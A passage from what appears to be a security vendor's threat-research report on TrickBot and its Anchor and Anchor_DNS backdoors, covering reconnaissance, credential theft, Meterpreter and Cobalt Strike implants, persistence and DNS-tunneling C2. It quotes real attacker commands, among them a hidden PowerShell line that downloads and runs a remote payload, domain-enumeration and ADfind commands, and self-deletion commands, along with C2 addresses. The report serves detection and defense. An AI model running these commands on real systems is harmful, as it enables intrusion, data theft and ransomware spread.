<p>TrickBot’s stealer module also tries to extract keys from <a href="https://filezilla-project.org/">Filezilla</a>, <a href="https://www.openssh.com/">OpenSSH</a> and <a href="https://openvpn.net/">OpenVPN</a>.</p>
<div style="text-align: center;"><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-128.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>TrickBot attempting to steal keys from Filezilla, OpenSSH, and OpenVPN.</em></p>
<p><strong>Reconnaissance Commands</strong></p>
<p>In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including <strong>nltest.exe</strong>, <strong>net.exe</strong>, <strong>ipconfig.exe</strong>, <strong>whoami.exe</strong>, and <strong>nslookup.exe.</strong> They gather information on:</p>
<ul>
<li>All trusted domains, domains, and domain controllers</li>
<li>A list of computers and network devices on the network</li>
<li>The infected machine user and groups the user belongs to</li>
<li>The infected machine, including machine name, operating system, workstation domain, and more information</li>
<li>Network adapters that have connected to the machine and DNS servers</li>
</ul>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-146.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>The net.exe process tree.</em></p>
<pre>Nltest / domain_trusts /all_trusts<br><br>Net view /all<br><br>Nltest /domain_trusts<br><br>Net view /all /domain<br><br>Ipconfig /all<br><br>Net config workstation<br><br>Nslookup “-q=srv_kerberos._tcp”<br><br>/c “start microsoft-edge:http://127.0.0.1:52715/11984”</pre>
<p style="text-align: center;"><em>Reconnaissance commands launched by TrickBot.</em></p>
<p>The attacker also uses PowerShell to test DNS entry settings. They use the command <strong>-q=srv_kerberos_tcp</strong> on the process <strong>nslookup.exe</strong> to open an interactive shell. They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-117.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>TrickBot testing DNS settings.</em></p>
<p>With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.</p>
<a id="trickbotinfection" data-hs-anchor="true"></a>
<h2>From TrickBot Infection to Interactive Hacking</h2>
<p>The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target. If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.</p>
<h3>PowerShell Payloads</h3>
<p>The threat actor leverages PowerShell to send additional payloads to the target machine. They issue commands to fetch a payload from a secondary server and, once it’s downloaded, immediately execute it on the target machine through PowerShell.</p>
<p><em>powershell.exe -nop -WindowStyle Hidden -executionpolicy bypass -c "IEX ((new-object net.webclient).downloadstring('hxxps://northracing[.]net/?a=irs&amp;x=[base64]'))"</em></p>
<p>The northracing[.]net URL contains a PowerShell script in the contents of the webpage. Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (<em>?a=irs&amp;x=</em>) to find a sandbox report for <a href="https://any.run/report/daf223b923f335c3de66cae8a091063361262669c8f9acaf59a352b1e0e07b8c/b92f9889-00f9-429d-97e4-fb149cfe66db">similar</a> <a href="https://app.any.run/tasks/b92f9889-00f9-429d-97e4-fb149cfe66db/">activity</a>. The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation. If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from. Each POST request is sent along with a UUID generated from the user’s hostname and the current process ID.</p>
<div><img src="https://www.cybereason.com/hubfs/image-146.png" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Information sent along each POST request in the payload.</em></p>
<p>A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.</p>
<p><img src="https://www.cybereason.com/hubfs/image-147.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-131.png" alt="" style="float: left;"><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-139.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>The PowerShell payloads using WMI to probe for system information.</em></p>
<p>This information is sent to the C2 along with the `i` parameter. When a response is received, the payload checks to see if the response matches the value <em>cex01</em>. If it does, the PowerShell script stops executing and kills the task. If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.</p>
<p>This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.</p>
<p>The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.</p>
<p><img src="https://www.cybereason.com/hubfs/image-148.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>The main loop that sends a POST request to the server. </em></p>
<p>Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet. The output of the command is sent back to the C2 server using a POST request with the “a” parameter.</p>
<a id="meterpreterandcobaltstrike" data-hs-anchor="true"></a>
<h3>Meterpreter &amp; Cobalt Strike Implants</h3>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-injected.png?width=780&amp;name=anchor-blog-injected.png" alt="anchor-blog-injected" width="780" style="display: block; margin-left: auto; margin-right: auto; width: 780px;" srcset="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-injected.png?width=390&amp;name=anchor-blog-injected.png 390w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-injected.png?width=780&amp;name=anchor-blog-injected.png 780w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-injected.png?width=1170&amp;name=anchor-blog-injected.png 1170w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-injected.png?width=1560&amp;name=anchor-blog-injected.png 1560w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-injected.png?width=1950&amp;name=anchor-blog-injected.png 1950w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-injected.png?width=2340&amp;name=anchor-blog-injected.png 2340w" sizes="(max-width: 780px) 100vw, 780px"></div>
<p style="text-align: center;"><em>The attack tree demonstrating the beginning of the hacking operation using Meterpreter.</em></p>
<h4>Meterpreter Implant</h4>
<p>The attackers use a <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter">Meterpreter</a> implant to carry out post-exploitation actions. The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory. The detected DLLs include:</p>
<ul>
<li><strong>Metsrv.dll:</strong> For Meterpreter, where the protocol and extension systems are implemented</li>
<li><strong>Ext_server_priv.x86.dll: </strong>For privilege escalation</li>
<li><strong>Ext_server_stdapi.x86.dll</strong>: A metasploit post exploitation module used for reconnaissance</li>
</ul>
<p>Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.</p>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-root-cause.png?width=634&amp;name=anchor-blog-root-cause.png" alt="anchor-blog-root-cause" width="634" style="display: block; margin-left: auto; margin-right: auto; width: 634px;" srcset="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-root-cause.png?width=317&amp;name=anchor-blog-root-cause.png 317w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-root-cause.png?width=634&amp;name=anchor-blog-root-cause.png 634w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-root-cause.png?width=951&amp;name=anchor-blog-root-cause.png 951w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-root-cause.png?width=1268&amp;name=anchor-blog-root-cause.png 1268w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-root-cause.png?width=1585&amp;name=anchor-blog-root-cause.png 1585w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-root-cause.png?width=1902&amp;name=anchor-blog-root-cause.png 1902w" sizes="(max-width: 634px) 100vw, 634px"></div>
<p style="text-align: center;"><em>Examining the loaded modules shows which Metasploit modules are loaded.<br><img src="https://www.cybereason.com/hubfs/image-149.png"><br></em></p>
<p>The Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-161.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<h4>Cobalt Strike Implant</h4>
<p>Using Meterpreter, the attackers injected <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> and other <a href="https://www.metasploit.com/">Metasploit</a> payloads into the rundll32.exe process.</p>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-rundll.png?width=780&amp;name=anchor-blog-rundll.png" alt="anchor-blog-rundll" width="780" style="display: block; margin-left: auto; margin-right: auto; width: 780px;" srcset="https://www.cybereason.com/hs-fs/hubfs/anchor-blog-rundll.png?width=390&amp;name=anchor-blog-rundll.png 390w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-rundll.png?width=780&amp;name=anchor-blog-rundll.png 780w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-rundll.png?width=1170&amp;name=anchor-blog-rundll.png 1170w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-rundll.png?width=1560&amp;name=anchor-blog-rundll.png 1560w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-rundll.png?width=1950&amp;name=anchor-blog-rundll.png 1950w, https://www.cybereason.com/hs-fs/hubfs/anchor-blog-rundll.png?width=2340&amp;name=anchor-blog-rundll.png 2340w" sizes="(max-width: 780px) 100vw, 780px"></div>
<p style="text-align: center;"><em>Attackers injecting Cobalt Strike and other Metasploit payloads into the rundll32.exe process.</em></p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-142.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Detection of Cobalt Strike, Meterpreter, and shellcode execution. </em></p>
<p>The attacker uses the following <a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">metasploit</a> modules:</p>
<ul>
<li><strong>ext_server_extapi.x86.dll</strong>: Obtains clipboard data and manipulates and decrypts the NTDS file</li>
<li><strong>ext_server_priv.x86.dll</strong>: Performs privilege escalation</li>
<li><strong>Ext_server_stdapi.x86.dll</strong>: Performs reconnaissance activity</li>
<li><strong>Bypassuac.x64.dll</strong>: A post-exploitation module used to bypass User Account Control</li>
</ul>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/image-150.png?width=521&amp;name=image-150.png" style="display: block; margin-left: auto; margin-right: auto; width: 521px;" width="521" srcset="https://www.cybereason.com/hs-fs/hubfs/image-150.png?width=261&amp;name=image-150.png 261w, https://www.cybereason.com/hs-fs/hubfs/image-150.png?width=521&amp;name=image-150.png 521w, https://www.cybereason.com/hs-fs/hubfs/image-150.png?width=782&amp;name=image-150.png 782w, https://www.cybereason.com/hs-fs/hubfs/image-150.png?width=1042&amp;name=image-150.png 1042w, https://www.cybereason.com/hs-fs/hubfs/image-150.png?width=1303&amp;name=image-150.png 1303w, https://www.cybereason.com/hs-fs/hubfs/image-150.png?width=1563&amp;name=image-150.png 1563w" sizes="(max-width: 521px) 100vw, 521px"></div>
<p style="text-align: center;"><i>Post-exploitation</i><em> modules reflectively loaded to rundll32.exe</em></p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-130.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>The connection to the external IP address 199.217.115[.]53 on port 8443.</em></p>
<p>Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including <a href="https://attack.mitre.org/groups/G0037/">the FIN6 threat actor</a>.</p>
<h4>Active Directory Discovery using Cobalt Strike</h4>
<p>The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:</p>
<ul>
<li><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1">https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Invoke-DACheck.ps1</a></li>
<li><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna">https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/Initial-LAdminCheck.cna</a></li>
</ul>
<p>The attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine’s user is in the admin or domain admin group.</p>
<p>After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-138.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>The obfuscated and compressed PowerShell command.</em></p>
<p>The decoded PowerShell command that attempts to gather domain controller information.</p>
<a id="adfind" data-hs-anchor="true"></a>
<h4>Active Directory Discovery using ADfind</h4>
<p>The attackers deploys a batch script that executes the <a href="http://www.joeware.net/freetools/tools/adfind/">ADfind.exe</a> tool to enumerate users, groups, and computers of the Windows domain.</p>
<pre>adfind.exe -f "(objectcategory=organizationalUnit)"<br><br>adfind.exe -gcb -sc trustdmp<br><br>adfind.exe -f "objectcategory=computer"<br><br>adfind.exe -sc trustdmp<br><br>adfind.exe -f "(objectcategory=person)"<br><br>adfind.exe -subnets -f (objectCategory=subnet)<br><br>adfind.exe -f "(objectcategory=group)"<br><br></pre>
<p>The ADfind tool has reportedly been used previously in <a href="https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html">attacks related to FIN6</a>.</p>
<a id="anchordnsvariant" data-hs-anchor="true"></a>
<h2>New Anchor_DNS Variant Discovered</h2>
<p>One of the most interesting payloads in these attacks is the <em>Anchor_DNS</em> malware, which was originally discovered in <a href="https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns">October 2019 by NTT Security</a>. It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers. Though this variant was first discovered in October 2019, there is evidence that <em>Anchor_DNS </em>was used as far back as March 2019.\</p>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-133.png?width=636&amp;name=Dropping%20the%20Anchor-133.png" alt="" style="display: block; margin-left: auto; margin-right: auto; width: 636px;" width="636" srcset="https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-133.png?width=318&amp;name=Dropping%20the%20Anchor-133.png 318w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-133.png?width=636&amp;name=Dropping%20the%20Anchor-133.png 636w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-133.png?width=954&amp;name=Dropping%20the%20Anchor-133.png 954w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-133.png?width=1272&amp;name=Dropping%20the%20Anchor-133.png 1272w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-133.png?width=1590&amp;name=Dropping%20the%20Anchor-133.png 1590w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-133.png?width=1908&amp;name=Dropping%20the%20Anchor-133.png 1908w" sizes="(max-width: 636px) 100vw, 636px"></div>
<p style="text-align: center;"><em>Oldest Anchor_DNS sample observed, SHA-1: b388243bf5899c99091ac2df13339f141659bbd4</em></p>
<p>This new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets. <em>Anchor_DNS</em> is still undergoing rapid development cycles with code changes and new feature updates every few weeks.</p>
<p>This is a new variant of <em>Anchor_DNS</em> that appeared as early as November 2019 and exhibits the following changes in code and behavior:</p>
<ul>
<li>No self-deletion mechanism shown in previous samples</li>
<li>No internet connectivity checks using legitimate online web services</li>
<li>A built-in capability to check for C2 availability using ICMP (ping)</li>
<li>Additional partial string encryption and code obfuscation</li>
</ul>
<h3>Static Analysis Observations</h3>
<table style="border-color: #000000; border-collapse: collapse; table-layout: fixed;" cellpadding="4" border="1">
<tbody>
<tr>
<td style="text-align: center;">
<p><strong>File name</strong></p>
</td>
<td style="text-align: center;">
<p><strong>SHA-1</strong></p>
</td>
</tr>
<tr>
<td style="text-align: center;">
<p>anchorDNS_x64.exe</p>
</td>
<td style="text-align: center;">
<p>5f1ad1787106de9725005d8da33d815d0994ee83</p>
</td>
</tr>
</tbody>
</table>
<p>anchorDNS_x64.exe contains a PDB path with the name of the malware, <em>Anchor_DNS</em>. This file is the 64-bit version of<em> Anchor_DNS</em>, however, there were earlier instances of the 32-bit version as well. The project name shows that this is the fifth version of <em>Anchor_DNS</em>.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-141.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>`PDB PATH: C:\simsim\anchorDNS.v5\Bin\x64\Release\anchorDNS_x64.pdb</em></p>
<p>Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of <em>Anchor_DNS</em> are not native english speakers.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-124.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Multiple typos and grammatical mistakes in the Anchor_DNS code. </em></p>
<p>The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer. The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.</p>
<pre>&nbsp;</pre>
<div><img src="https://www.cybereason.com/hubfs/image-151.png" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p>Anchor_DNS was able to stay under-the-radar by using specific execution flags. If these command-line arguments are not supplied, the Anchor_DNS terminates.</p>
<ul>
<li><strong>-i flag: </strong>
<ul>
<li>creates a scheduled task with the following naming convention (e.g “Notepad++ autoupdate#94654”): <strong>[random folder name in %APPDATA%]</strong> <strong>autoupdate#[random_number]</strong></li>
</ul>
<br><img src="https://www.cybereason.com/hs-fs/hubfs/image-153.png?width=474&amp;name=image-153.png" width="474" style="width: 474px; display: block; margin-left: auto; margin-right: auto;" srcset="https://www.cybereason.com/hs-fs/hubfs/image-153.png?width=237&amp;name=image-153.png 237w, https://www.cybereason.com/hs-fs/hubfs/image-153.png?width=474&amp;name=image-153.png 474w, https://www.cybereason.com/hs-fs/hubfs/image-153.png?width=711&amp;name=image-153.png 711w, https://www.cybereason.com/hs-fs/hubfs/image-153.png?width=948&amp;name=image-153.png 948w, https://www.cybereason.com/hs-fs/hubfs/image-153.png?width=1185&amp;name=image-153.png 1185w, https://www.cybereason.com/hs-fs/hubfs/image-153.png?width=1422&amp;name=image-153.png 1422w" sizes="(max-width: 474px) 100vw, 474px">&nbsp;
<ul>
<li>Writes <a href="https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/">NTFS ADS</a> files ($TASK, $GUID, $FILE)</li>
</ul>
</li>
</ul>
<table style="border-color: #000000; border-collapse: collapse; table-layout: fixed;" cellpadding="4" border="1">
<tbody>
<tr>
<td style="text-align: center;">
<p><strong>Alternate Data Stream</strong></p>
</td>
<td style="text-align: center;">
<p><strong>ADS Contents</strong></p>
</td>
<td style="text-align: center;">
<p><strong>Decoded Contents</strong></p>
</td>
</tr>
<tr>
<td style="text-align: center;">
<p>edskype.exe:$FILE</p>
</td>
<td style="text-align: center;">
<p>QzpcVXNlcnNcdXNlclxBcHBEYXRhXFJvYW1pbmdcU2t5cGVcZWRza3lwZS5leGU=</p>
</td>
<td style="text-align: center;">
<p>C:\Users\user\AppData\Roaming\Skype\edskype.exe</p>
</td>
</tr>
<tr>
<td style="text-align: center;">
<p>edskype.exe:$TASK</p>
</td>
<td style="text-align: center;"><br>
<p>Tm90ZXBhZCsrIGF1dG91cGRhdGUjOTQ2NTQ</p>
</td>
<td style="text-align: center;"><br>
<p>Notepad++ autoupdate#94654</p>
</td>
</tr>
<tr>
<td style="text-align: center;">
<p>edskype.exe:$GUID</p>
</td>
<td style="text-align: center;">
<p>[BASE64]</p>
</td>
<td style="text-align: center;">
<p>/anchor_dns/[COMPUTER_NAME]_[Windows_Version].[clientID]/</p>
</td>
</tr>
</tbody>
</table>
<ul>
<li><strong>-u flag: </strong>
<ul>
<li><strong>New Variant</strong>: executes the malware’s main communication module with the C2</li>
<li><strong>Old Variant:</strong>
<ul>
<li>Drops a copy in %TEMP%</li>
<li>Creates ADS files ($GUID, $FILE)</li>
</ul>
</li>
</ul>
</li>
<li><strong>-s flag: </strong>appears only on older versions of <em>Anchor_DNS</em> and runs the program without creating persistence and self-deletes once done.</li>
<li><strong>--log=</strong>: expects a file name to write log file in C:\Users\[USER]</li>
</ul>
<p><img src="https://www.cybereason.com/hubfs/image-154.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Contents of the debug file created by Anchor_DNS.</em></p>
<h4>C2 Communication</h4>
<p>Older and newer versions of <em>Anchor_DNS</em> communicate over DNS. However, the newer version described here does not check Internet connectivity using legitimate online web services like <strong>ipinfo.io</strong>, and instead uses a built-in capability to check for the server’s availability using the ICMP protocol.</p>
<p><img src="https://www.cybereason.com/hubfs/image-155.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Determining C2 server connectivity.</em></p>
<h5>DNS Tunneling</h5>
<p>Anchor_DNS communicates with the C2 servers over DNS using <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">DNS Tunneling</a>. With this technique, Anchor_DNS can transfer data, receive commands, and download an additional payload, as detailed in <a href="https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns">NTT Security’s report</a> on an older Anchor_DNS sample.</p>
<p>By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-148.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Example of DNS Tunneling traffic generated by Anchor_DNS.</em></p>
<a id="anchorandtrickbot" data-hs-anchor="true"></a>
<h2>Discovery of The Anchor Malware and Its Connection to TrickBot</h2>
<p style="text-align: left;">During our investigation, we found several unidentified malware samples related to TrickBot infections. The malware is dubbed <em>Anchor</em> by its authors and has been active since August 2018. Unlike <em>Anchor_DNS</em>, the <em>Anchor</em> malware does not implement communication over DNS. However, it does share many behavioral, code, and string similarities with <em>Anchor_DNS</em> and some similarities to TrickBot.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-134.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Earliest Anchor sample observed (SHA-1:3ed09498214d93c9ec14a15286546d242ad58943)</em></p>
<p><img src="https://www.cybereason.com/hubfs/image-156.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>PDB path for the earliest Anchor sample found.</em></p>
<p>Many <em>Anchor</em> samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.</p>
<p><img src="https://www.cybereason.com/hubfs/image-157.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>List of Anchor payloads found on VirusTotal with 0/0 detection rate.</em></p>
<p>The malware has both x86 and x64 versions and contains an installer component to install the malware.</p>
<table style="border-color: #000000; border-collapse: collapse; table-layout: fixed;" cellpadding="4" border="1">
<tbody>
<tr>
<td style="width: 157.778px;">
<p><strong>Payload Name</strong></p>
</td>
<td style="width: 225.556px;">
<p><strong>Hash</strong></p>
</td>
<td style="width: 394.444px;">
<p><strong>PDB Path</strong></p>
</td>
</tr>
<tr>
<td style="width: 157.778px;">
<p>anchorInstaller_x86</p>
</td>
<td style="width: 225.556px;">
<p>3ed09498214d93c9ec14a15286546d242ad58943</p>
<p>4bba60ff11f8b150b004960c658ad74a707ebcea</p>
</td>
<td style="width: 394.444px;">
<p>D:\MyProjects\secondWork\Anchor\Win32\Release\anchorInstaller_x86.pdb</p>
<p>C:\Users\ProFi\Desktop\data\Win32\anchorInstaller_x86Code\anchorInstaller_x86.pdb</p>
</td>
</tr>
<tr>
<td style="width: 157.778px;">
<p>anchorInstaller_x64</p>
</td>
<td style="width: 225.556px;">
<p>e75983b073ff0632e35e237f6622466c2699687c</p>
</td>
<td style="width: 394.444px;">&nbsp;</td>
</tr>
<tr>
<td style="width: 157.778px;">
<p>Anchor_x86</p>
</td>
<td style="width: 225.556px;">
<p>Bd26238fb7d7e16ea79073d882bba00d34dd859c</p>
<p>F3683a0c12154e8bf44d9d942db3eac9e930e7a5</p>
<p>9ebb541dcb24d564448a6f5e00c613b73eba7148</p>
</td>
<td style="width: 394.444px;">
<p>D:\MyProjects\secondWork\Anchor\Win32\Release\Anchor_x86.pdb</p>
<p>C:\Users\ProFi\Desktop\data\Win32\anchorInstaller_x86Code\Anchor_x86.pdb</p>
<p>D:\Anchor\Anchor\Win32\Release\Anchor_x86.pdb</p>
</td>
</tr>
<tr>
<td style="width: 157.778px;">
<p>Anchor_x64</p>
</td>
<td style="width: 225.556px;">
<p>46c595e580719a4c54f55b4041f81d6e50ab4062</p>
<p>e5dc7c8bfa285b61dda1618f0ade9c256be75d1a</p>
</td>
<td style="width: 394.444px;">
<p>D:\Anchor\x64\Debug\Anchor_x64.pdb</p>
<br>
<p>C:\[JOB]\Anchor\x64\Release\Anchor_x64.pdb</p>
</td>
</tr>
</tbody>
</table>
<p>The <em>Anchor</em> payload is delivered by <em>AnchorInstaller</em> <em>AnchorInstaller</em> unpacks the Anchor DLL and drops it in the %SYSTEMROOT% or %SYSTEMROOT%\System32 folder. The dropped DLL is loaded by the service <strong>netTcpSvc</strong>, which is created by the malware.</p>
<p><img src="https://www.cybereason.com/hubfs/image-158.png" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>Anchor service persistence found in the registry.</em></p>
<h3>NTFS ADS File - Storing the GUID</h3>
<p>Similar to <em>Anchor_DNS</em>, <em>Anchor</em> creates an NTFS ADS file <strong>$GUID</strong> to store its GUID:</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-127.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Anchor GUID stored as an NTFS ADS.</em></p>
<p>Unlike <em>Anchor_DNS</em>, which stores the information in Base64, <em>Anchor’s</em> GUID is saved in cleartext.</p>
<h3>Self Deletion</h3>
<p><em>Anchor</em> and older versions of <em>Anchor_DNS</em> implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:</p>
<ul>
<li>cmd.exe /c timeout 1 &amp;&amp; del C:\Users\[USER]\[SAMPLE_LOCATION]"</li>
<li>cmd.exe /C PowerShell 'Start-Sleep 5; Remove-Item C:\Users\[USER]\[SAMPLE_LOCATION]'</li>
</ul>
<h3>C2 Communication</h3>
<p>Similar to TrickBot, <em>Anchor</em> tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers. It uses the following hardcoded web services to test connectivity:</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/image-159.png?width=705&amp;name=image-159.png" style="display: block; margin-left: auto; margin-right: auto; width: 705px;" width="705" srcset="https://www.cybereason.com/hs-fs/hubfs/image-159.png?width=353&amp;name=image-159.png 353w, https://www.cybereason.com/hs-fs/hubfs/image-159.png?width=705&amp;name=image-159.png 705w, https://www.cybereason.com/hs-fs/hubfs/image-159.png?width=1058&amp;name=image-159.png 1058w, https://www.cybereason.com/hs-fs/hubfs/image-159.png?width=1410&amp;name=image-159.png 1410w, https://www.cybereason.com/hs-fs/hubfs/image-159.png?width=1763&amp;name=image-159.png 1763w, https://www.cybereason.com/hs-fs/hubfs/image-159.png?width=2115&amp;name=image-159.png 2115w" sizes="(max-width: 705px) 100vw, 705px"></p>
<p>Once it has established connectivity, it communicates with a set of hardcoded C2 servers.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-147.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>Communication with a set of hardcoded C2 servers.</em></p>
<p>The request and response follow the same <a href="http://malware-traffic-analysis.net/2019/10/02/index.html">C2 communication format as TrickBot</a>.</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-132.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>The request and response format for Anchor.</em></p>
<h3>Connecting Anchor / Anchor_DNS to TrickBot</h3>
<p><em>Anchor</em> and <em>Anchor_DNS</em> are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads. There are also several other similarities noted below.</p>
<h4>GUID Generation Function</h4>
<p>The GUID generation functions for <em>Anchor_DNS</em> and <em>Anchor</em> seem almost identical to that of the GUID generated by TrickBot. The GUID follows this pattern:</p>
<p><span style="color: #ff0201;"><strong>[Machine_NAME]</strong></span>_<span style="color: #69a84f;"><strong>[Windows_Version]</strong></span>.<span style="color: #0600ff;"><strong>[Client_ID]</strong></span></p>
<table style="border-color: #000000; border-collapse: collapse; table-layout: fixed;" cellpadding="4" border="1">
<tbody>
<tr>
<td style="text-align: left; width: 133.333px;">
<p><strong>Malware Name</strong></p>
</td>
<td style="text-align: left; width: 644.444px;">
<p><strong>GUID</strong></p>
</td>
</tr>
<tr>
<td style="text-align: left; width: 133.333px;">
<p>Anchor_DNS</p>
</td>
<td style="text-align: left; width: 644.444px;">
<p>/<strong>anchor_dns</strong>/<span style="color: #ff0201;"><strong>MACHINE-001</strong></span>_<span style="color: #93c47d;"><strong>W617601</strong></span>.<span style="color: #0600ff;"><strong>D4CB942AA18EFF519DCBCAE88A0A99FB</strong></span>/</p>
</td>
</tr>
<tr>
<td style="text-align: left; width: 133.333px;">
<p>Anchor</p>
</td>
